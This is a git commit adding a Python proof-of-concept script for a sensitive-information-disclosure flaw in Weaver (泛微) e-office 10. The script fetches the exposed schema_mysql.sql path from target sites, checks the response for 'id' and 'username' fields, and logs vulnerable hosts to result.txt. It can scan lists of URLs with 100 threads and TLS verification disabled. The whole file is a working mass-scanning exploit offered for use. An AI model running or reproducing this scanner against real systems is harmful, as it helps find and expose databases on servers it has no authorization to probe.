f011d952f5b1c8633755bb9ee351b6c891ebebd4
予怡 <3058727187@qq.com>
2025-09-13 01:12:31 +0800

    Add files via upload

---
+++ 泛微 e-office 10 schema_mysql.sql敏感信息泄露/poc.py
@@ -0,0 +1,57 @@
+import argparse,requests,re,sys
+from multiprocessing.dummy import Pool
+from urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
+
+def a():
+    text="""
+██████╗  ██████╗  ██████╗
+██╔══██╗██╔═══██╗██╔════╝
+██████╔╝██║   ██║██║     
+██╔═══╝ ██║   ██║██║     
+██║     ╚██████╔╝╚██████╗
+╚═╝      ╚═════╝  ╚═════╝
+                                                         
+"""
+    print(text)
+
+def poc(target):
+    payloade="/eoffice10/empty_scene/db/schema_mysql.sql"
+    try:
+        res=requests.get(url=target,timeout=5,verify=False)
+        if res.status_code==200:
+            res1=requests.get(url=target+payloade,timeout=5,verify=False)
+            if re.search('(id)',res1.text).group(0)=="id" and re.search('(username)',res1.text).group(0)=="username":
+                print(f"[+]{target}存在信息泄露漏洞")
+                with open("result.txt",'a',encoding="utf-8")as f:
+                    f.write(target+'\n')
+            else:
+                print(f"[-]{target}不存在该漏洞")
+        else:
+            print(f"[*]{target}访问出现问题，请手工注入")
+    except:
+        pass
+
+
+def main():
+    a()
+    parse=argparse.ArgumentParser(description="泛微 e-office 10 schema_mysql.sql敏感信息泄露")
+    parse.add_argument('-u','--url',type=str,help="please input your link",dest="url")
+    parse.add_argument('-f','--file',type=str,help="please input your file",dest="file")
+    args=parse.parse_args()
+    if args.url and not args.file:
+        poc(args.url)
+    elif args.file and not args.url:
+        urllist=[]
+        with open(args.file,'r',encoding='utf-8')as fp:
+            for i in fp.readlines():
+                urllist.append(i.strip())
+        mp=Pool(100)
+        mp.map(poc,urllist)
+        mp.close
+        mp.join
+    else:
+        print(f"Usage : Python {sys.argv[0]} -h") 
+
+if __name__=="__main__":
+    main()
